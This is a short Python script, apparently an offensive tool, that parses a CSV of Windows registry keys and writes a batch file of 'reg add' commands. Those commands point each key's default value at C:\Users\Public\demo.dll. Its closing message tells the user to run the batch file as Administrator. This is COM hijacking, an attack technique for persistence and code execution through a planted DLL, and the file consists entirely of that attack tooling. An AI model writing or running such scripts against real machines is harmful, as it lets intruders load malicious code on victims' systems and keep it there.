#@author:九世
#@file:com_hajacking.py

import csv

class Jiexi(object):
    def __init__(self):
        self.path='demo.CSV'

    def rk(self):
        with open(self.path,'r',encoding='utf-8') as r:
            g=csv.DictReader(r)
            for name in g:
                z=[x for x in name]
                for i in z:
                    if 'HK' in str(name[i]):
                        print('reg add {} /ve /t REG_SZ /d C:\\Users\\Public\\demo.dll /f'.format(name[i]),file=open('com_hijack.bat','a',encoding='utf-8'))

if __name__ == '__main__':
    obj=Jiexi()
    obj.rk()
    print('[!] Administrator run com_hijack.bat,Thanks')